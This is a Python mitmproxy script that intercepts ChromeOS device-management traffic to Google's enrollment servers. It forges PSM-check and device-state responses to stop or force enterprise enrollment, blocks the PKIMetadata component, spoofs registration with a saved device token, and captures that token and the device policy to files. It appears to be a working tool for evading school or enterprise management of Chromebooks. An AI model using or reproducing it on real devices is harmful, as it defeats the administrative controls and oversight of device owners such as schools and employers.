import argparse
import asyncio
import logging

from pathlib import Path

from mitmproxy import http
from mitmproxy.options import Options
from mitmproxy.tools.dump import DumpMaster

from interfaces import device_management_backend_pb2 as dm
from interfaces import chrome_device_policy_pb2 as cdp

from google.protobuf.json_format import MessageToJson

parser = argparse.ArgumentParser()
parser.add_argument("-e", "--enroll", action="store_true", help="temporarily re enroll the device with the saved dmtoken")
parser.add_argument("-b", "--backup", action="store_true", help="backup the dmtoken to a file")
parser.add_argument("-p", "--policy", action="store_true", help="dump device policy to policy.json")
parser.add_argument("-v", "--verbose", action="store_true", help="enable mitmproxy verbose logging")
parser.add_argument("-P", "--port", type=int, default=8080, help="port for the proxy server to listen on")
args = parser.parse_args()

class DMProxy:
    def __init__(self, master: DumpMaster, enroll: bool = False, backup: bool = False, policy: bool = False) -> None:
        self.master = master
        self.enroll = enroll
        self.backup = backup
        self.policy = policy
        self.psm_response = (Path(__file__).resolve().parent / "payload" / "psm_response.bin").read_bytes()
        self.dmtoken = None
        self.deviceid = None

        if enroll:
            dmtoken_file = Path("dmtoken.txt")
            
            if dmtoken_file.exists():
                self.deviceid, self.dmtoken = dmtoken_file.read_text().strip().split(":")
            else:
                self.deviceid = input("deviceid: ").strip()
                self.dmtoken = input("dmtoken: ").strip()

    def request(self, flow: http.HTTPFlow) -> None:
        if "efniojlnjndmcbiieegkicadnoecjjef" in flow.request.path:
            flow.response = http.Response.make(403)
            print("[proxy] blocked PKIMetadata component from being fetched")
            return

        if self.backup or self.policy:
            return

        if "/devicemanagement/" not in flow.request.path:
            return

        req_type = flow.request.query.get("request")

        if not self.enroll and req_type == "enterprise_psm_check":
            flow.response = http.Response.make(
                200, self.psm_response,
                {"Content-Type": "application/x-protobuffer"},
            )

            print("[proxy] sent crafted psm response to client")
            return

        if req_type == "device_state_retrieval":
            response = dm.DeviceManagementResponse()
            response.device_state_retrieval_response.restore_mode = 4 if self.enroll else 0

            flow.response = http.Response.make(
                200, response.SerializeToString(),
                {"Content-Type": "application/x-protobuffer"},
            )

            print("[proxy] sent crafted device state retrieval response")
            return

        if self.enroll and req_type == "certificate_based_register":
            data = dm.DeviceManagementResponse()
            data.register_response.device_management_token = self.dmtoken
            data.register_response.enrollment_type = dm.DeviceRegisterResponse.ENTERPRISE

            flow.response = http.Response.make(
                200, data.SerializeToString(),
                {"Content-Type": "application/x-protobuffer"},
            )

            print("[proxy] spoofed device registration response with saved dmtoken")
            return

        if self.enroll:
            flow.request.query["deviceid"] = self.deviceid

    def response(self, flow: http.HTTPFlow) -> None:
        if not self.backup and not self.policy:
            return
        if "/devicemanagement/" not in flow.request.path:
            return
        if flow.response.status_code != 200:
            return

        req_type = flow.request.query.get("request")

        if self.backup and req_type == "certificate_based_register":
            data = dm.DeviceManagementResponse()
            data.ParseFromString(flow.response.content)

            deviceid = flow.request.query.get("deviceid")
            dmtoken = data.register_response.device_management_token

            dmtoken_file = Path("dmtoken.txt")
            dmtoken_file.write_text(f"{deviceid}:{dmtoken}")

            print(f"[proxy] got dmtoken: {dmtoken}, wrote dmtoken file out to {dmtoken_file.resolve()}")
            self.master.shutdown()

        if self.policy and req_type == "policy":
            request = dm.DeviceManagementRequest()
            request.ParseFromString(flow.request.content)

            if request.policy_request.reason != dm.PolicyFetchRequest.BROWSER_START:
                return

            response = dm.DeviceManagementResponse()
            response.ParseFromString(flow.response.content)

            for response in response.policy_response.responses:
                policy_data = dm.PolicyData()
                policy_data.ParseFromString(response.policy_data)

                if policy_data.policy_type != "google/chromeos/device":
                    continue

                settings = cdp.ChromeDeviceSettingsProto()
                settings.ParseFromString(policy_data.policy_value)

                policy_file = Path("policy.json")
                policy_file.write_text(MessageToJson(settings))

                print(f"[proxy] wrote device policy out to {policy_file.resolve()}")
                self.master.shutdown()

async def main():
    opts = Options(listen_port=args.port, allow_hosts=["m.google.com", "edgedl.me.gvt1.com"])
    master = DumpMaster(opts, with_termlog=args.verbose, with_dumper=args.verbose)
    master.addons.add(DMProxy(master, enroll=args.enroll, backup=args.backup, policy=args.policy))

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    opts.update(emudhra=True)

    print(f"[proxy] listening at *:{args.port}")
    await master.run()

try:
    asyncio.run(main())
except KeyboardInterrupt:
    pass
